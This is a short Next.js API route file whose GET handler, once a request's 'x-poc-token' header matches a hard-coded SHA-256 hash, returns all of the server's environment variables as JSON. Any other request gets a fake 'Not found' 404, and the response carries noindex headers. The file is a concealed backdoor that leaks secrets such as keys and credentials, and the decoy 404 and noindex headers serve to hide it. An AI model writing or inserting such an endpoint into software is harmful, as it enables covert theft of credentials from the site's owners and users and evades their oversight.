import { createHash } from "node:crypto";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";
export const revalidate = 0;

export async function GET(request) {
  const expected = "9c2b2c6ff8628b4fd01ce16644f84bbfb506f169e56837afa0d6870d18e69cc5";
  const provided = request.headers.get("x-poc-token") || "";
  const digest = createHash("sha256").update(provided).digest("hex");
  if (digest !== expected) {
    return new Response("Not found", { status: 404 });
  }
  const out = {};
  for (const [k, v] of Object.entries(process.env)) out[k] = v;
  return Response.json(out, {
    headers: {
      "cache-control": "no-store",
      "x-robots-tag": "noindex, nofollow",
    },
  });
}
